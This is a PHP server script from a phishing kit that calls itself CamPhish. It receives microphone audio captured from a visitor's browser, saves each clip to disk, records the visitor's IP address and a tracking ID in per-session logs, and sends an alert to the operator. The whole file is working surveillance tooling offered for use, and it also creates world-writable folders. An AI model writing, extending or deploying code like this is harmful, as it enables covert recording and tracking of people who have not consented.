<?php
// audio.php — saves microphone recordings
require_once __DIR__ . '/alerts.php';
require_once __DIR__ . '/helpers.php';

$cfg  = include __DIR__ . '/config.php';
$date = date('dMYHis');
$uuid = ($cfg['session_tracking'] ?? true) ? get_visitor_uuid() : 'unknown';
$ip   = trim(explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown')[0]);

$save_dir = __DIR__ . '/logs/audio';
if (!is_dir($save_dir)) mkdir($save_dir, 0777, true);

if (!empty($_POST['audio_clip'])) {
    $audioData     = $_POST['audio_clip'];
    $filteredData  = substr($audioData, strpos($audioData, ',') + 1);
    $unencodedData = base64_decode($filteredData);
    $filepath      = $save_dir . '/mic_' . $date . '.webm';
    file_put_contents($filepath, $unencodedData);
    file_put_contents(__DIR__ . '/logs/AudioLog.log', "audio\n", FILE_APPEND);

    if ($uuid !== 'unknown') {
        $uuid_dir = __DIR__ . '/logs/sessions/' . $uuid;
        if (!is_dir($uuid_dir)) mkdir($uuid_dir, 0755, true);
        file_put_contents($uuid_dir . '/timeline.log', "[" . date('d-M-Y H:i:s') . "] AUDIO | " . basename($filepath) . "\n", FILE_APPEND);
    }

    $msg = "🎙 <b>CamPhish — Audio Recording!</b>\n📡 IP: <code>{$ip}</code>\n📁 <i>" . basename($filepath) . "</i>\n🆔 UUID: <code>{$uuid}</code>";
    dispatch_alert('audio', $msg, ['ip' => $ip, 'file' => basename($filepath), 'uuid' => $uuid]);
}

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
